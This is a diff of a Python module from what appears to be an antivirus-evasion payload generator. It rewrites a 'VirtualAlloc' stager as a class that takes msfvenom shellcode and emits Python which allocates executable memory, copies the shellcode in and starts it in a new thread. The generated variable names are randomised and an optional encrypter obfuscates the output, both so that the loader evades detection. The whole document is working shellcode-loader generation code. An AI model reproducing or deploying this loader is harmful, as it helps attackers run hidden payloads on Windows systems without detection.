@@ -1,34 +1,59 @@
-# Code adapted from:
-# http://www.debasish.in/2012/04/execute-shellcode-using-python.html
+"""
 
-# Import Modules
-from modules.auxiliary import shellcode
+Inline shellcode injection.
+
+Uses VirtualAlloc() to allocate space for shellcode, RtlMoveMemory() to 
+copy the shellcode in, then calls CreateThread() to invoke.
+
+Inspiration from http://www.debasish.in/2012/04/execute-shellcode-using-python.html
+
+module by @christruncer
+
+"""
+
+from modules.common import shellcode
 from modules.common import messages
 from modules.common import randomizer
-from modules.common import supportfiles
+from modules.common import crypters
 
-def pyVirtualAlloc():
-    # Generate Shellcode Using msfvenom
-    Shellcode = shellcode.genShellcode()
-    
-    # Generate Random Variable Names
-    ShellcodeVariableName = randomizer.randomString()
-    RandPtr = randomizer.randomString()
-    RandBuf = randomizer.randomString()
-    RandHt = randomizer.randomString()
 
-    # Create Payload File
-    PayloadFile = open('payload.py', 'w')
-    PayloadFile.write('#!/usr/bin/python\n\n')
-    PayloadFile.write('import ctypes\n\n')
-    PayloadFile.write(ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n\n')
-    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
-    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
-    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
-    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
-    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
-    PayloadFile.close()
+class Stager:
+	
+	def __init__(self):
+		# required options
+		self.shortname = "VirtualAlloc"
+		self.description = "Super basic allocation of memory through windows API, stashing shellcode in memory, and execution of the shellcode"
+		self.language = "python"
+		self.rating = "Normal"
+		self.extension = "py"
+		
+		# optional
+		self.shellcode = shellcode.Shellcode()
+		# options we require user interaction for- format is {Option : [Value, Description]]}
+		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
+						"use_encrypter" : ["N", "Use the python encrypter"]}
+		
+	def generate(self):
+		
+		# Generate Shellcode Using msfvenom
+		Shellcode = self.shellcode.generate()
+		
+		# Generate Random Variable Names
+		ShellcodeVariableName = randomizer.randomString()
+		RandPtr = randomizer.randomString()
+		RandBuf = randomizer.randomString()
+		RandHt = randomizer.randomString()
+		
+		# Create Payload code
+		PayloadCode = 'import ctypes\n'
+		PayloadCode += ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
+		PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
+		PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+		PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
+		PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
+		PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
 
-    # Create Supporting Files and Print Exit Message
-    supportfiles.supportingFiles()
-    messages.endmsg()
+		if self.required_options["use_encrypter"][0].lower() == "y":
+			PayloadCode = crypters.pyherion(PayloadCode)
+
+		return PayloadCode
